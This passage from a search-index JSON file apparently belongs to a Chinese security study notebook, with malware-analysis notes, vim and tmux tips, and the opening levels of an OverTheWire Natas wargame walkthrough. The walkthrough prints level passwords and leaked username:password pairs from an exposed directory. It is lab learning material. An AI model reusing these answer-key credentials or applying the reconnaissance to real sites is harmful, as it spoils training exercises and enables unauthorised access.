Walker"},{"location":"en/MalwareAnalysis/knowledge/ch1/#dll","text":"","title":"\u5e38\u89c1\u7684DLL"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_11","text":"Ex,\u662f\u5fae\u8f6f\u5728\u66f4\u65b0\u65b0\u51fd\u6570\u548c\u65e7\u51fd\u6570\u4e0d\u517c\u5bb9\u65f6\u52a0\u5165\u7684\u4e1c\u897f\u3002 \u800cA\u548cW\u7ed3\u5c3e\u662f\u6307\u63a5\u53d7\u53c2\u6570\u5206\u522b\u662fascii\u548cunicode","title":"\u51fd\u6570\u547d\u540d\u7ea6\u5b9a"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_12","text":"\u9700\u8981\u81ea\u5df1\u719f\u6089\u4e00\u4e9bwindows\u51fd\u6570","title":"\u5bfc\u5165\u5bfc\u51fa"},{"location":"en/MalwareAnalysis/knowledge/ch1/#peview","text":"\u5de5\u5177\uff0c\u67e5\u770bPE\u6587\u4ef6\u683c\u5f0f\u7684","title":"PEview"},{"location":"en/MalwareAnalysis/knowledge/ch1/#resource-hacker","text":"\u5de5\u5177\uff0c\u67e5\u770b\u8d44\u6e90\u8282","title":"Resource Hacker"},{"location":"en/MalwareAnalysis/knowledge/ch1/#_13","text":"PEBrowse Professional PE Explorer","title":"\u5176\u4ed6\u5de5\u5177"},{"location":"en/Useful-tools/","text":"WHY I WRITE THIS? \u5728pwn.college\u4e4b\u4e2d\uff0c\u53cd\u6b63\u7531\u4e8e\u6211\u7f51\u4e0d\u884c\uff0c\u90a3\u4e2a\u56fe\u5f62\u5316\u754c\u9762\u513f\u6211\u7279\u522b\u5361\uff0c\u6211\u57fa\u672c\u4e0a\u80fd\u4e0d\u7528\u6211\u5c31\u4e0d\u7528\uff0c\u4e00\u5f00\u59cb\u641e\u90a3\u4e2awireshark\u5dee\u70b9\u513f\u5361\u7834\u9632\u4e86\u3002\u53e6\u5916\u4e00\u4e2a\u539f\u56e0\u6211\u5199\u5728\u4e86cse365\u7684wp\u91cc\u9762\uff0c\u5c31\u662f\u6d89\u53ca\u5230\u53ea\u6709\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u624d\u80fd\u76d1\u542c\u8fd9\u4ef6\u4e8b\u3002\u56e0\u6b64\uff0ctmux\u548cvim\u53c8\u63d0\u4e0a\u65e5\u7a0b\u4e86\u3002\u5f53\u7136\uff0c\u6700\u91cd\u8981\u7684\u539f\u56e0\u662f\uff0c\u6211\u5e0c\u671b\u628avim\u641e\u6210\u4e00\u4e2a\u597d\u7528\u7684IDE\u3002","title":"WHY I WRITE THIS?"},{"location":"en/Useful-tools/#why-i-write-this","text":"\u5728pwn.college\u4e4b\u4e2d\uff0c\u53cd\u6b63\u7531\u4e8e\u6211\u7f51\u4e0d\u884c\uff0c\u90a3\u4e2a\u56fe\u5f62\u5316\u754c\u9762\u513f\u6211\u7279\u522b\u5361\uff0c\u6211\u57fa\u672c\u4e0a\u80fd\u4e0d\u7528\u6211\u5c31\u4e0d\u7528\uff0c\u4e00\u5f00\u59cb\u641e\u90a3\u4e2awireshark\u5dee\u70b9\u513f\u5361\u7834\u9632\u4e86\u3002\u53e6\u5916\u4e00\u4e2a\u539f\u56e0\u6211\u5199\u5728\u4e86cse365\u7684wp\u91cc\u9762\uff0c\u5c31\u662f\u6d89\u53ca\u5230\u53ea\u6709\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u624d\u80fd\u76d1\u542c\u8fd9\u4ef6\u4e8b\u3002\u56e0\u6b64\uff0ctmux\u548cvim\u53c8\u63d0\u4e0a\u65e5\u7a0b\u4e86\u3002\u5f53\u7136\uff0c\u6700\u91cd\u8981\u7684\u539f\u56e0\u662f\uff0c\u6211\u5e0c\u671b\u628avim\u641e\u6210\u4e00\u4e2a\u597d\u7528\u7684IDE\u3002","title":"WHY I WRITE THIS?"},{"location":"en/Useful-tools/tmux/","text":"TMUX","title":"TMUX"},{"location":"en/Useful-tools/tmux/#tmux","text":"","title":"TMUX"},{"location":"en/Useful-tools/vim/","text":"Vim\u5b9e\u7528\u6280\u5de7 \u8fd9\u672c\u4e66\u5e94\u8be5\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\uff01 basic \u9996\u5148\u4f60\u9700\u8981\u4f1a\u4e00\u4e9b\u57fa\u7840\u6027\u7684\u64cd\u4f5c \u6280\u5de71 \u4f7f\u7528 . \u547d\u4ee4\u6765\u91cd\u590d \u6280\u5de72 \u5f88\u591aVim\u7684\u5355\u952e\u547d\u4ee4\u90fd\u53ef\u4ee5\u88ab\u770b\u6210\u4e24\u4e2a\u6216\u591a\u4e2a\u5176\u4ed6\u547d\u4ee4\u7684\u7ec4\u5408 \u6280\u5de73 f\u67e5\u627e\uff0cs\u5220\u9664\uff0c\u5206\u53f7\u4f1a\u7ee7\u7eed\u67e5\u627e \u6280\u5de74 \u76ee\u7684 \u64cd\u4f5c \u91cd\u590d \u56de\u9000 \u505a\u51fa\u4e00\u4e2a\u4fee\u6539 {edit} . u \u5728\u884c\u5185\u67e5\u627e\u4e0b\u4e00\u6307\u5b9a\u5b57\u7b26 f{char}/t{char} ; , \u5728\u884c\u5185\u67e5\u627e\u4e0a\u4e00\u6307\u5b9a\u5b57\u7b26 F{char}/T{char} ; , \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0b\u4e00\u5904\u5339\u914d\u9879 /pattern n N \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0a\u4e00\u5904\u5339\u914d\u9879 ?pattern n N \u6267\u884c\u66ff\u6362 :s/target/replacement & u \u6267\u884c\u4e00\u7cfb\u5217\u4fee\u6539 qx{changes}q @x u ## \u6280\u5de75 \u6309 * \u641c\u7d22\uff0cc\u662f\u4fee\u6539 Vim \u4ece\u5165\u95e8\u5230\u7cbe\u901a \u7f51\u5740\u5728\u8fd9\u513f vim\u54f2\u5b66 \u51cf\u5c11\u8ba4\u8bc6\u8d1f\u8377\u5e76\u5e2e\u52a9\u4eba\u4eec\u4e13\u6ce8\u4e8e\u5b9e\u9645\u4efb\u52a1 \u7f13\u51b2\u533a\uff0c\u7a97\u53e3\uff0c\u6807\u7b7e \u7f13\u51b2\u533a\u662f\u5de5\u4f5c\u7684\u5730\u65b9\uff0c\u7a97\u53e3\u662f\u7f13\u51b2\u533a\u7684\u89c6\u7a97\uff0c\u6807\u7b7e\u662f\u7a97\u53e3\u7684\u96c6\u5408\u3002 \u5df2\u6fc0\u6d3b\u3001\u5df2\u8f7d\u5165\u3001\u5df2\u5217\u51fa\u3001\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a \u7528\u7c7b\u4f3c vim file1 \u7684\u547d\u4ee4\u542f\u52a8 Vim \u3002\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5c06\u4f1a\u88ab\u52a0\u8f7d\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u4f60\u73b0\u5728\u6709\u4e00\u4e2a\u5df2\u8f7d\u5165\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u5728 Vim \u4e2d\u4fdd\u5b58\u8fd9\u4e2a\u6587\u4ef6\uff0c\u7f13\u51b2\u533a\u5185\u5bb9\u5c06\u4f1a\u88ab\u540c\u6b65\u5230\u78c1\u76d8\u4e0a\uff08\u5199\u56de\u6587\u4ef6\u4e2d\uff09\u3002 \u7531\u4e8e\u8fd9\u4e2a\u7f13\u51b2\u533a\u4e5f\u5728\u4e00\u4e2a\u7a97\u53e3\u4e0a\u663e\u793a\uff0c\u6240\u4ee5\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5df2\u6fc0\u6d3b\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u73b0\u5728\u901a\u8fc7 :e file2 \u547d\u4ee4\u52a0\u8f7d\u53e6\u4e00\u4e2a\u6587\u4ef6\uff0cfile1 \u5c06\u4f1a\u53d8\u6210\u4e00\u4e2a\u9690\u85cf\u7684\u7f13\u51b2\u533a\uff0c\u5e76\u4e14 file2 \u53d8\u6210\u5df2\u6fc0\u6d3b\u7f13\u51b2\u533a\u3002 \u4f7f\u7528 :ls \u6211\u4eec\u80fd\u591f\u5217\u51fa\u6240\u6709\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\u3002\u63d2\u4ef6\u7f13\u51b2\u533a\u548c\u5e2e\u52a9\u7f13\u51b2\u533a\u901a\u5e38\u88ab\u6807\u8bb0\u4e3a\u4e0d\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\uff0c\u56e0\u4e3a\u90a3\u5e76\u4e0d\u662f\u4f60\u7ecf\u5e38\u9700\u8981\u5728\u7f16\u8f91\u5668\u4e2d\u7f16\u8f91\u7684\u5e38\u89c4\u6587\u4ef6\u3002\u901a\u8fc7 :ls! \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u88ab\u653e\u5165\u7f13\u51b2\u533a\u5217\u8868\u7684\u548c\u672a\u88ab\u653e\u5165\u5217\u8868\u7684\u7f13\u51b2\u533a\u3002 \u672a\u547d\u540d\u7684\u7f13\u51b2\u533a\u662f\u4e00\u79cd\u6ca1\u6709\u5173\u8054\u7279\u5b9a\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff0c\u8fd9\u79cd\u7f13\u51b2\u533a\u7ecf\u5e38\u88ab\u63d2\u4ef6\u4f7f\u7528\u3002\u6bd4\u5982 :enew \u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65e0\u540d\u4e34\u65f6\u7f13\u51b2\u533a\u3002\u6dfb\u52a0\u4e00\u4e9b\u6587\u672c\u7136\u540e\u4f7f\u7528 :w /tmp/foo \u5c06\u4ed6\u5199\u5165\u5230\u78c1\u76d8\uff0c\u8fd9\u6837\u8fd9\u4e2a\u7f13\u51b2\u533a\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a\u3002 \u5bc4\u5b58\u5668 \u7c7b\u578b \u6807\u8bc6 \u8bfb\u5199\u8005 \u662f\u5426\u4e3a\u53ea\u8bfb \u5305\u542b\u7684\u5b57\u7b26\u6765\u6e90 Unnamed \" vim \u5426 \u6700\u8fd1\u4e00\u6b21\u7684\u590d\u5236\u6216\u5220\u9664\u64cd\u4f5c ( d , c , s , x , y ) Numbered 0 \u81f3 9 vim \u5426 \u5bc4\u5b58\u5668 0 : \u6700\u8fd1\u4e00\u6b21\u590d\u5236\u3002\u5bc4\u5b58\u5668 1 : \u6700\u8fd1\u4e00\u6b21\u5220\u9664\u3002\u5bc4\u5b58\u5668 2 : \u5012\u6570\u7b2c\u4e8c\u6b21\u5220\u9664\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u5bf9\u4e8e\u5bc4\u5b58\u5668 1 \u81f3 9 \uff0c\u4ed6\u4eec\u5176\u5b9e\u662f\u53ea\u8bfb\u7684\u6700\u591a\u5305\u542b 9 \u4e2a\u5143\u7d20\u7684\u961f\u5217\u3002\u8fd9\u91cc\u7684\u961f\u5217\u5373\u4e3a\u6570\u636e\u7c7b\u578b queue Small delete - vim \u5426 \u6700\u8fd1\u4e00\u6b21\u884c\u5185\u5220\u9664 Named a \u81f3 z , A \u81f3 Z \u7528\u6237 \u5426 \u5982\u679c\u4f60\u901a\u8fc7\u590d\u5236\u64cd\u4f5c\u5b58\u50a8\u6587\u672c\u81f3\u5bc4\u5b58\u5668 a \uff0c\u90a3\u4e48 a \u4e2d\u7684\u6587\u672c\u5c31\u4f1a\u88ab\u5b8c\u5168\u8986\u76d6\u3002\u5982\u679c\u4f60\u5b58\u50a8\u81f3 A \uff0c\u90a3\u4e48\u4f1a\u5c06\u6587\u672c\u6dfb\u52a0\u7ed9\u5bc4\u5b58\u5668 a \uff0c\u4e0d\u4f1a\u8986\u76d6\u4e4b\u524d\u5df2\u6709\u7684\u6587\u672c Read-only : \u4e0e . \u548c % vim \u662f : : \u6700\u8fd1\u4e00\u6b21\u4f7f\u7528\u7684\u547d\u4ee4\uff0c . : \u6700\u8fd1\u4e00\u6b21\u6dfb\u52a0\u7684\u6587\u672c\uff0c % : \u5f53\u524d\u7684\u6587\u4ef6\u540d Alternate buffer # vim \u5426 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u662f\u5f53\u524d\u7a97\u53e3\u4e2d\uff0c\u4e0a\u4e00\u6b21\u8bbf\u95ee\u7684\u7f13\u51b2\u533a\u3002\u8bf7\u53c2\u9605 :h alternate-file \u6765\u83b7\u53d6\u66f4\u591a\u5e2e\u52a9 Expression = \u7528\u6237 \u5426 \u590d\u5236 VimL \u4ee3\u7801\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u5b58\u50a8\u4ee3\u7801\u7247\u6bb5\u7684\u6267\u884c\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u5728\u63d2\u5165\u6a21\u5f0f\u4e0b\u590d\u5236 <c-r>=5+5<cr> \uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5c31\u4f1a\u5b58\u5165 10 Selection + \u548c * vim \u5426 * \u548c + \u662f \u526a\u8d34\u677f \u5bc4\u5b58\u5668 Drop ~ vim \u662f \u6700\u540e\u4e00\u6b21\u62d6\u62fd\u6dfb\u52a0\u81f3 Vim \u7684\u6587\u672c\uff08\u9700\u8981 \"+dnd\" \u652f\u6301\uff0c\u6682\u65f6\u53ea\u652f\u6301 GTK GUI\u3002\u8bf7\u53c2\u9605 :help dnd \u53ca :help quote~ \uff09 Black hole _ vim \u5426 \u4e00\u822c\u79f0\u4e3a\u9ed1\u6d1e\u5bc4\u5b58\u5668\u3002\u5bf9\u4e8e\u5f53\u524d\u64cd\u4f5c\uff0c\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u5728\u5176\u4ed6\u5bc4\u5b58\u5668\u4e2d\u4fdd\u7559\u6587\u672c\uff0c\u90a3\u5c31\u5728\u547d\u4ee4\u524d\u52a0\u4e0a _ \u3002\u6bd4\u5982\uff0c \"_dd \u547d\u4ee4\u4e0d\u4f1a\u5c06\u6587\u672c\u653e\u5230\u5bc4\u5b58\u5668 \" \u3001 1 \u3001 + \u6216 * \u4e2d Last search pattern / vim \u5426 \u6700\u8fd1\u4e00\u6b21\u901a\u8fc7 / \u3001 ? \u6216 :global \u7b49\u547d\u4ee4\u8c03\u7528\u7684\u5339\u914d\u6761\u4ef6 \u5341\u5206\u6709\u7528\uff01\uff01\uff01 ## \u8303\u56f4 \u719f\u7ec3\u4f7f\u7528\u8303\u56f4\uff0c\u53ef\u4ee5\u64cd\u4f5c\u5f97\u5f88\u5feb \u6bd4\u5982\u9017\u53f7\u5206\u53f7\u8868\u793a\u7684\u8303\u56f4\u3002 \u8865\u5168 ctrl+x","title":"Vim\u5b9e\u7528\u6280\u5de7"},{"location":"en/Useful-tools/vim/#vim","text":"\u8fd9\u672c\u4e66\u5e94\u8be5\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\u3001\u53cd\u590d\u770b\uff01","title":"Vim\u5b9e\u7528\u6280\u5de7"},{"location":"en/Useful-tools/vim/#basic","text":"\u9996\u5148\u4f60\u9700\u8981\u4f1a\u4e00\u4e9b\u57fa\u7840\u6027\u7684\u64cd\u4f5c","title":"basic"},{"location":"en/Useful-tools/vim/#1","text":"\u4f7f\u7528 . \u547d\u4ee4\u6765\u91cd\u590d","title":"\u6280\u5de71"},{"location":"en/Useful-tools/vim/#2","text":"\u5f88\u591aVim\u7684\u5355\u952e\u547d\u4ee4\u90fd\u53ef\u4ee5\u88ab\u770b\u6210\u4e24\u4e2a\u6216\u591a\u4e2a\u5176\u4ed6\u547d\u4ee4\u7684\u7ec4\u5408","title":"\u6280\u5de72"},{"location":"en/Useful-tools/vim/#3","text":"f\u67e5\u627e\uff0cs\u5220\u9664\uff0c\u5206\u53f7\u4f1a\u7ee7\u7eed\u67e5\u627e","title":"\u6280\u5de73"},{"location":"en/Useful-tools/vim/#4","text":"\u76ee\u7684 \u64cd\u4f5c \u91cd\u590d \u56de\u9000 \u505a\u51fa\u4e00\u4e2a\u4fee\u6539 {edit} . u \u5728\u884c\u5185\u67e5\u627e\u4e0b\u4e00\u6307\u5b9a\u5b57\u7b26 f{char}/t{char} ; , \u5728\u884c\u5185\u67e5\u627e\u4e0a\u4e00\u6307\u5b9a\u5b57\u7b26 F{char}/T{char} ; , \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0b\u4e00\u5904\u5339\u914d\u9879 /pattern n N \u5728\u6587\u6863\u4e2d\u67e5\u627e\u4e0a\u4e00\u5904\u5339\u914d\u9879 ?pattern n N \u6267\u884c\u66ff\u6362 :s/target/replacement & u \u6267\u884c\u4e00\u7cfb\u5217\u4fee\u6539 qx{changes}q @x u ## \u6280\u5de75 \u6309 * \u641c\u7d22\uff0cc\u662f\u4fee\u6539","title":"\u6280\u5de74"},{"location":"en/Useful-tools/vim/#vim_1","text":"\u7f51\u5740\u5728\u8fd9\u513f","title":"Vim \u4ece\u5165\u95e8\u5230\u7cbe\u901a"},{"location":"en/Useful-tools/vim/#vim_2","text":"\u51cf\u5c11\u8ba4\u8bc6\u8d1f\u8377\u5e76\u5e2e\u52a9\u4eba\u4eec\u4e13\u6ce8\u4e8e\u5b9e\u9645\u4efb\u52a1","title":"vim\u54f2\u5b66"},{"location":"en/Useful-tools/vim/#_1","text":"\u7f13\u51b2\u533a\u662f\u5de5\u4f5c\u7684\u5730\u65b9\uff0c\u7a97\u53e3\u662f\u7f13\u51b2\u533a\u7684\u89c6\u7a97\uff0c\u6807\u7b7e\u662f\u7a97\u53e3\u7684\u96c6\u5408\u3002","title":"\u7f13\u51b2\u533a\uff0c\u7a97\u53e3\uff0c\u6807\u7b7e"},{"location":"en/Useful-tools/vim/#_2","text":"\u7528\u7c7b\u4f3c vim file1 \u7684\u547d\u4ee4\u542f\u52a8 Vim \u3002\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5c06\u4f1a\u88ab\u52a0\u8f7d\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u4f60\u73b0\u5728\u6709\u4e00\u4e2a\u5df2\u8f7d\u5165\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u5728 Vim \u4e2d\u4fdd\u5b58\u8fd9\u4e2a\u6587\u4ef6\uff0c\u7f13\u51b2\u533a\u5185\u5bb9\u5c06\u4f1a\u88ab\u540c\u6b65\u5230\u78c1\u76d8\u4e0a\uff08\u5199\u56de\u6587\u4ef6\u4e2d\uff09\u3002 \u7531\u4e8e\u8fd9\u4e2a\u7f13\u51b2\u533a\u4e5f\u5728\u4e00\u4e2a\u7a97\u53e3\u4e0a\u663e\u793a\uff0c\u6240\u4ee5\u4ed6\u4e5f\u662f\u4e00\u4e2a\u5df2\u6fc0\u6d3b\u7684\u7f13\u51b2\u533a\u3002\u5982\u679c\u4f60\u73b0\u5728\u901a\u8fc7 :e file2 \u547d\u4ee4\u52a0\u8f7d\u53e6\u4e00\u4e2a\u6587\u4ef6\uff0cfile1 \u5c06\u4f1a\u53d8\u6210\u4e00\u4e2a\u9690\u85cf\u7684\u7f13\u51b2\u533a\uff0c\u5e76\u4e14 file2 \u53d8\u6210\u5df2\u6fc0\u6d3b\u7f13\u51b2\u533a\u3002 \u4f7f\u7528 :ls \u6211\u4eec\u80fd\u591f\u5217\u51fa\u6240\u6709\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\u3002\u63d2\u4ef6\u7f13\u51b2\u533a\u548c\u5e2e\u52a9\u7f13\u51b2\u533a\u901a\u5e38\u88ab\u6807\u8bb0\u4e3a\u4e0d\u53ef\u4ee5\u5217\u51fa\u7684\u7f13\u51b2\u533a\uff0c\u56e0\u4e3a\u90a3\u5e76\u4e0d\u662f\u4f60\u7ecf\u5e38\u9700\u8981\u5728\u7f16\u8f91\u5668\u4e2d\u7f16\u8f91\u7684\u5e38\u89c4\u6587\u4ef6\u3002\u901a\u8fc7 :ls! \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u88ab\u653e\u5165\u7f13\u51b2\u533a\u5217\u8868\u7684\u548c\u672a\u88ab\u653e\u5165\u5217\u8868\u7684\u7f13\u51b2\u533a\u3002 \u672a\u547d\u540d\u7684\u7f13\u51b2\u533a\u662f\u4e00\u79cd\u6ca1\u6709\u5173\u8054\u7279\u5b9a\u6587\u4ef6\u7684\u7f13\u51b2\u533a\uff0c\u8fd9\u79cd\u7f13\u51b2\u533a\u7ecf\u5e38\u88ab\u63d2\u4ef6\u4f7f\u7528\u3002\u6bd4\u5982 :enew \u5c06\u4f1a\u521b\u5efa\u4e00\u4e2a\u65e0\u540d\u4e34\u65f6\u7f13\u51b2\u533a\u3002\u6dfb\u52a0\u4e00\u4e9b\u6587\u672c\u7136\u540e\u4f7f\u7528 :w /tmp/foo \u5c06\u4ed6\u5199\u5165\u5230\u78c1\u76d8\uff0c\u8fd9\u6837\u8fd9\u4e2a\u7f13\u51b2\u533a\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a\u3002","title":"\u5df2\u6fc0\u6d3b\u3001\u5df2\u8f7d\u5165\u3001\u5df2\u5217\u51fa\u3001\u5df2\u547d\u540d\u7684\u7f13\u51b2\u533a"},{"location":"en/Useful-tools/vim/#_3","text":"\u7c7b\u578b \u6807\u8bc6 \u8bfb\u5199\u8005 \u662f\u5426\u4e3a\u53ea\u8bfb \u5305\u542b\u7684\u5b57\u7b26\u6765\u6e90 Unnamed \" vim \u5426 \u6700\u8fd1\u4e00\u6b21\u7684\u590d\u5236\u6216\u5220\u9664\u64cd\u4f5c ( d , c , s , x , y ) Numbered 0 \u81f3 9 vim \u5426 \u5bc4\u5b58\u5668 0 : \u6700\u8fd1\u4e00\u6b21\u590d\u5236\u3002\u5bc4\u5b58\u5668 1 : \u6700\u8fd1\u4e00\u6b21\u5220\u9664\u3002\u5bc4\u5b58\u5668 2 : \u5012\u6570\u7b2c\u4e8c\u6b21\u5220\u9664\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u5bf9\u4e8e\u5bc4\u5b58\u5668 1 \u81f3 9 \uff0c\u4ed6\u4eec\u5176\u5b9e\u662f\u53ea\u8bfb\u7684\u6700\u591a\u5305\u542b 9 \u4e2a\u5143\u7d20\u7684\u961f\u5217\u3002\u8fd9\u91cc\u7684\u961f\u5217\u5373\u4e3a\u6570\u636e\u7c7b\u578b queue Small delete - vim \u5426 \u6700\u8fd1\u4e00\u6b21\u884c\u5185\u5220\u9664 Named a \u81f3 z , A \u81f3 Z \u7528\u6237 \u5426 \u5982\u679c\u4f60\u901a\u8fc7\u590d\u5236\u64cd\u4f5c\u5b58\u50a8\u6587\u672c\u81f3\u5bc4\u5b58\u5668 a \uff0c\u90a3\u4e48 a \u4e2d\u7684\u6587\u672c\u5c31\u4f1a\u88ab\u5b8c\u5168\u8986\u76d6\u3002\u5982\u679c\u4f60\u5b58\u50a8\u81f3 A \uff0c\u90a3\u4e48\u4f1a\u5c06\u6587\u672c\u6dfb\u52a0\u7ed9\u5bc4\u5b58\u5668 a \uff0c\u4e0d\u4f1a\u8986\u76d6\u4e4b\u524d\u5df2\u6709\u7684\u6587\u672c Read-only : \u4e0e . \u548c % vim \u662f : : \u6700\u8fd1\u4e00\u6b21\u4f7f\u7528\u7684\u547d\u4ee4\uff0c . : \u6700\u8fd1\u4e00\u6b21\u6dfb\u52a0\u7684\u6587\u672c\uff0c % : \u5f53\u524d\u7684\u6587\u4ef6\u540d Alternate buffer # vim \u5426 \u5927\u90e8\u5206\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u662f\u5f53\u524d\u7a97\u53e3\u4e2d\uff0c\u4e0a\u4e00\u6b21\u8bbf\u95ee\u7684\u7f13\u51b2\u533a\u3002\u8bf7\u53c2\u9605 :h alternate-file \u6765\u83b7\u53d6\u66f4\u591a\u5e2e\u52a9 Expression = \u7528\u6237 \u5426 \u590d\u5236 VimL \u4ee3\u7801\u65f6\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u5b58\u50a8\u4ee3\u7801\u7247\u6bb5\u7684\u6267\u884c\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u5728\u63d2\u5165\u6a21\u5f0f\u4e0b\u590d\u5236 <c-r>=5+5<cr> \uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bc4\u5b58\u5668\u5c31\u4f1a\u5b58\u5165 10 Selection + \u548c * vim \u5426 * \u548c + \u662f \u526a\u8d34\u677f \u5bc4\u5b58\u5668 Drop ~ vim \u662f \u6700\u540e\u4e00\u6b21\u62d6\u62fd\u6dfb\u52a0\u81f3 Vim \u7684\u6587\u672c\uff08\u9700\u8981 \"+dnd\" \u652f\u6301\uff0c\u6682\u65f6\u53ea\u652f\u6301 GTK GUI\u3002\u8bf7\u53c2\u9605 :help dnd \u53ca :help quote~ \uff09 Black hole _ vim \u5426 \u4e00\u822c\u79f0\u4e3a\u9ed1\u6d1e\u5bc4\u5b58\u5668\u3002\u5bf9\u4e8e\u5f53\u524d\u64cd\u4f5c\uff0c\u5982\u679c\u4f60\u4e0d\u5e0c\u671b\u5728\u5176\u4ed6\u5bc4\u5b58\u5668\u4e2d\u4fdd\u7559\u6587\u672c\uff0c\u90a3\u5c31\u5728\u547d\u4ee4\u524d\u52a0\u4e0a _ \u3002\u6bd4\u5982\uff0c \"_dd \u547d\u4ee4\u4e0d\u4f1a\u5c06\u6587\u672c\u653e\u5230\u5bc4\u5b58\u5668 \" \u3001 1 \u3001 + \u6216 * \u4e2d Last search pattern / vim \u5426 \u6700\u8fd1\u4e00\u6b21\u901a\u8fc7 / \u3001 ? \u6216 :global \u7b49\u547d\u4ee4\u8c03\u7528\u7684\u5339\u914d\u6761\u4ef6 \u5341\u5206\u6709\u7528\uff01\uff01\uff01 ## \u8303\u56f4 \u719f\u7ec3\u4f7f\u7528\u8303\u56f4\uff0c\u53ef\u4ee5\u64cd\u4f5c\u5f97\u5f88\u5feb \u6bd4\u5982\u9017\u53f7\u5206\u53f7\u8868\u793a\u7684\u8303\u56f4\u3002","title":"\u5bc4\u5b58\u5668"},{"location":"en/Useful-tools/vim/#_4","text":"ctrl+x","title":"\u8865\u5168"},{"location":"en/WarGame/","text":"WarGame \u4e00\u4e2a\u5341\u5206\u4f18\u79c0\u7684\u514d\u8d39\u9776\u573a\uff0c\u975e\u5e38\u9002\u5408\u65b0\u624b\u5165\u95e8\u6216\u8005\u9ad8\u624b\u4f11\u95f2\u5a31\u4e50\u3002","title":"WarGame"},{"location":"en/WarGame/#wargame","text":"\u4e00\u4e2a\u5341\u5206\u4f18\u79c0\u7684\u514d\u8d39\u9776\u573a\uff0c\u975e\u5e38\u9002\u5408\u65b0\u624b\u5165\u95e8\u6216\u8005\u9ad8\u624b\u4f11\u95f2\u5a31\u4e50\u3002","title":"WarGame"},{"location":"en/WarGame/Natas/","text":"level0 \u76f4\u63a5\u767b\u5f55\uff0c\u7136\u540e\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas0\", \"pass\": \"natas0\" };</script></head> <body> <h1>natas0</h1> <div id=\"content\"> You can find the password for the next level on this page. <!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --> </div> </body> </html> level1 \u4e0d\u8ba9\u53f3\u952e\u4e86 \u90a3\u5c31\u6309F12\u554a <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 --> level2 \u8bf4\u5565\u4e5f\u6ca1\u6709 \u8fd8\u662f\u770b\u6e90\u7801 <html> <head> <!-- This stuff in the header has nothing to do with the level --> <link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /> <link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /> <script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script> <script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script> <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script> <script>var wechallinfo = { \"level\": \"natas2\", \"pass\": \"h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7\" };</script></head> <body> <h1>natas2</h1> <div id=\"content\"> There is nothing on this page <img src=\"files/pixel.png\"> </div> </body></html> \u6709\u4e2a\u56fe\u7247\uff0c\u70b9\u8fdb\u53bb\u770b\uff0c\u8fdb\u7236\u76ee\u5f55 http://natas2.natas.labs.overthewire.org/files/ \u5f97\u5230\u5bc6\u7801 # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m 